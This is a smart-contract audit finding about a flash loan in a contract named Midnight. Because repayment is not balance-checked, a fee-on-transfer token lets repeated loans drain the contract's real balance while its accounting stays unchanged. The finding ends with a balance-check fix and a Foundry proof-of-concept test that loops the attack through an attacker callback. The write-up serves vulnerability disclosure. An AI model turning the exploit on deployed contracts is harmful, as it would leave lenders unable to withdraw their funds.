### Title
Flash Loan Repayment Accepts Fee-on-Transfer Shortfall, Silently Draining Contract Balance - (File: src/libraries/SafeTransferLib.sol / src/Midnight.sol)

### Summary
`flashLoan` sends `assets[i]` out and unconditionally pulls `assets[i]` back via `safeTransferFrom`, but `safeTransferFrom` only validates the boolean return value — it never checks the actual amount credited to the contract. With a fee-on-transfer loan token, the repayment leg delivers `assets[i] - fee` while the call returns `true`, silently reducing the contract's real balance by `fee` per invocation while all accounting state (`withdrawable`, `collateral`, `lossFactor`) remains unchanged.

### Finding Description
**Code path:**

`flashLoan` (Midnight.sol:737-752) executes three steps per token:
1. `SafeTransferLib.safeTransfer(tokens[i], callback, assets[i])` — contract balance decreases by `assets[i]`, callback receives `assets[i] - fee` (fee-on-transfer deducts from recipient).
2. `IFlashLoanCallback(callback).onFlashLoan(...)` — attacker-controlled callback returns `CALLBACK_SUCCESS`.
3. `SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i])` — deducts `assets[i]` from callback's balance, but contract receives only `assets[i] - fee`; the call returns `true`.

`safeTransferFrom` (SafeTransferLib.sol:24-34) only checks `token.code.length > 0`, call success, and the boolean return value. It performs no balance-delta check on `address(this)`.

**Attacker inputs and preconditions:**
- A fee-on-transfer token is a loan token in any market (market creator is unprivileged).
- Attacker (callback receiver) holds a pre-existing balance of at least `fee` of that token to cover the shortfall so `transferFrom` does not revert on insufficient balance.
- Attacker calls `flashLoan([token], [assets], callback, data)` and returns `CALLBACK_SUCCESS`.

**Why existing checks fail:**
- `safeTransferFrom` validates only the ERC-20 boolean, not the received amount.
- There is no pre/post balance snapshot anywhere in `flashLoan`.
- The Certora `tokenBalanceCorrect` invariant (Solvency.spec:162-177) and `flashLoansPaidBack` rule (Solvency.spec:181-187) are formally proven only under the explicit assumption "no fee taking from sender or receiver" (Solvency.spec:31). They provide no protection here.

### Impact Explanation
Each successful call reduces `token.balanceOf(address(this))` by `fee` while `withdrawableSum(token)` and `collateralSum(token)` are unchanged. After N calls the contract is undercollateralized by `N * fee`. Lenders calling `withdraw` will eventually hit a real-balance shortfall even though their accounting credit is intact, causing insolvency. The `lossFactor` computation, which depends on the ratio of real assets to tracked units, becomes corrupted as the gap widens.

### Likelihood Explanation
Preconditions are reachable by unprivileged actors: any market creator can list a fee-on-transfer loan token (no token whitelist exists in `touchMarket`), and the attacker only needs to hold `fee` tokens to bootstrap each call. The attack is repeatable at will and each iteration costs the attacker only `fee` tokens — a griefing/insolvency path rather than a profitable drain, but fully executable. Fee-on-transfer tokens (e.g., PAXG, STA, tokens with configurable fees) are a real and deployed token class.

### Recommendation
Capture the contract's token balance before and after the repayment loop and assert the full amount was returned:

```solidity
for (uint256 i = 0; i < tokens.length; i++) {
    uint256 balanceBefore = IERC20(tokens[i]).balanceOf(address(this));
    SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
    require(
        IERC20(tokens[i]).balanceOf(address(this)) >= balanceBefore + assets[i],
        FlashLoanNotRepaid()
    );
}
```

This mirrors the pattern used by Morpho Blue and Aave v3 and closes the gap for any non-standard transfer token.

### Proof of Concept
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";
import {IFlashLoanCallback} from "src/interfaces/ICallbacks.sol";

/// Fee-on-transfer ERC20: deducts 1% from recipient on every transfer/transferFrom.
contract FeeToken is ERC20 {
    uint256 constant FEE_BPS = 100; // 1%
    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 fee = amount * FEE_BPS / 10_000;
        super._transfer(from, to, amount - fee); // recipient gets less
        super._transfer(from, address(0xdead), fee); // fee burned
    }
}

contract FeeFlashLoanPoC is Test, IFlashLoanCallback {
    Midnight midnight;
    FeeToken token;
    uint256 constant LOAN = 1_000e18;

    function setUp() public {
        midnight = new Midnight(...);
        token = new FeeToken();
        // Seed contract with LOAN tokens (simulating lender deposits)
        deal(address(token), address(midnight), LOAN);
        // Attacker seeds self with enough to cover fee shortfall each round
        deal(address(token), address(this), 100e18);
        token.approve(address(midnight), type(uint256).max);
    }

    function onFlashLoan(address, address[] calldata, uint256[] calldata, bytes calldata)
        external returns (bytes32)
    {
        // approve midnight to pull back full LOAN amount
        token.approve(msg.sender, type(uint256).max);
        return CALLBACK_SUCCESS;
    }

    function testFuzz_feeTokenDrainsBalance(uint8 n) public {
        n = uint8(bound(n, 1, 50));
        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = LOAN;

        uint256 balanceBefore = token.balanceOf(address(midnight));
        for (uint256 i = 0; i < n; i++) {
            midnight.flashLoan(tokens, amounts, address(this), "");
        }
        uint256 balanceAfter = token.balanceOf(address(midnight));

        // ASSERTION: balance must be unchanged — this FAILS, proving the bug
        assertEq(balanceAfter, balanceBefore, "balance drained by fee-on-transfer");
    }
}
```
